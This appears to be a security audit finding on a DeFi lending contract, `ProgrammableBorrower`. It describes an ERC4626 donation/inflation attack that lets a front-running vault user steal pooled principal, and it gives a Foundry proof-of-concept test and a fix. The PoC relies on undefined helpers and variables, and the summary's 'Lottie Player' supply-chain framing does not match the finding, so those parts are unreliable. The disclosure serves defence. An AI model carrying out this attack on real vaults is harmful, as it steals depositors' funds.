### Title
ProgrammableBorrower deposits pool funds into the ERC4626 vault with no minimum-share check, enabling a first-depositor inflation/donation attack that steals the epoch principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
The Lottie Player incident is a supply-chain compromise of a trusted third-party dependency. The on-chain analog in this codebase is `ProgrammableBorrower`'s blind trust in its configured external ERC4626 `vault`: `_depositToVault` performs `vault.deposit(_assetAmount, address(this))` and records the assets as principal without checking how many shares were minted. An unprivileged user of that vault (an allowed attacker class) can execute the classic ERC4626 first-depositor/donation inflation attack against the pool's epoch-start deposit, capturing nearly the entire deposited principal while the loss is socialized to the BB tranche.

### Finding Description
At `onStartEpoch`, the borrower adapter parks all idle underlying into the vault via `_depositToVault(underlyingToken.balanceOf(address(this)), 0)` [1](#0-0) . `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` and ignores the returned `shares` entirely — there is no `minShares`/slippage bound [2](#0-1) .

Attack sequence (buffer phase, programmable mode, before/at epoch start):

1. Vault is freshly deployed/integrated (or has been emptied — e.g., after a full `emergencyExitVault` + `setVault` cycle, or simply a young vault). Attacker deposits 1 wei to mint 1 share, then directly transfers (donates) ~`D` underlying to the vault, inflating `convertToAssets(1)` to ~`D`.
2. Manager calls `startEpoch` on `IdleCDOEpochVariant`, which transfers the pooled liquidity to `ProgrammableBorrower` and invokes `onStartEpoch`. The `deposit` mints `floor(amount * 1 / (D + amount))` shares — for `D >= amount`, 0 shares, or a share count whose redemption value is far below `amount`.
3. Attacker redeems their 1 share for `(D + amount) / totalShares ≈ D + amount`, profiting ~`amount`.
4. Epoch accounting treats this honestly but fatally: `epochStartVaultAssets = startAssets` is snapshotted **before** the deposit in underlying terms [3](#0-2) , so at `stopEpoch` the missing `amount` surfaces as `vaultLoss` via `_vaultNetInterest` [4](#0-3)  and flows into `totalInterestDueNow` as a reduction/loss [5](#0-4) . `stopEpochWithDuration(_lossAmount)` then socializes the loss to BB tranche holders first via `_updateAccounting` [6](#0-5) .

None of the existing guards stop this: `_skimDonatedAssets` only protects the CDO's own balance, not the external vault's pricing; `_guarded` checks limits only; `setVault` is honest-owner controlled but nothing requires the vault to be pre-seeded or inflation-resistant (no dead-share requirement like OZ's virtual offsets). The same lack of slippage protection exists on every `vault.withdraw`/`vault.redeem` path, but the deposit-mint path is the exploitable one.

### Impact Explanation
Direct theft of the epoch-start principal deposited into the vault: for a pool parking `X` underlying, an attacker donating `~X` captures almost all of `X` from tranche depositors, while the loss waterfall pushes the deficit onto BB tranche holders (or triggers shutdown). Loss is quantified as `≈ amount deposited − donation cost`, bounded by pool TVL.

### Likelihood Explanation
Requires the vault to be in a low/empty-liquidity state when the pool's first deposit lands — realistic for a newly configured vault (the supply-chain analog: a freshly integrated or compromised external component) or after `emergencyExitVault` unwinds a position. The attacker needs only to be an unprivileged vault user and to front-run the `startEpoch` deposit, both of which are within the allowed attacker model.

### Recommendation
Enforce a minimum-shares bound on every vault interaction: pass an expected share count (e.g., `vault.previewDeposit(_assetAmount) * (1 - slippageBps)`) and revert if `shares < minShares` in `_depositToVault`; equivalently validate `vault.convertToAssets(shares)` covers `≥ amount - tolerance`. Require owner-configured vaults to use an ERC4626 with dead-share/virtual-offset inflation protection or require the owner to seed the vault before enabling the facility.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";
// reuse MockERC4626-style vault + MockERC20 from test/foundry/ProgrammableBorrowerCreditVault.t.sol

contract VaultInflationTheftTest is Test {
    // Assume: underlying = USDC-like mock, vault = standard ERC4626 with
    // shares = assets * totalSupply / totalAssets, no virtual offsets.
    // ProgrammableBorrower initialized with vault + idleCDO mock.

    function test_epochStartDonationStealsPrincipal() public {
        address attacker = address(0xA11CE);
        uint256 poolDeposit = 1_000_000e6;
        uint256 donation = poolDeposit; // attacker's cost

        // 1) Attacker seeds the empty vault: 1 wei deposit + donation
        underlying.mint(attacker, donation + 1);
        vm.startPrank(attacker);
        underlying.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);              // 1 share
        underlying.transfer(address(vault), donation); // inflate price
        vm.stopPrank();

        // 2) Epoch starts: idleCDO pushes poolDeposit then calls onStartEpoch
        underlying.mint(address(pb), poolDeposit);
        vm.prank(idleCDO);
        pb.onStartEpoch(0); // deposits poolDeposit; mints ~1 share (or 0)

        // 3) Attacker redeems: gets back donation + ~all of poolDeposit
        vm.prank(attacker);
        uint256 stolen = vault.redeem(vault.balanceOf(attacker), attacker, attacker);
        assertGt(stolen, donation + poolDeposit * 99 / 100);

        // 4) stopEpoch reports the hole as vaultLoss; BB tranche eats it
        ( , uint256 loss ) = pbVaultNetLossView();
        assertApproxEqAbs(loss, poolDeposit, 2);
    }
}
```

Key PoC points: `vault.deposit` returns shares that `_depositToVault` never validates; `epochStartVaultAssets` is snapshotted pre-deposit so the theft is recorded as vault loss and socialized to BB holders at `stopEpochWithDuration`.

  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;

  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
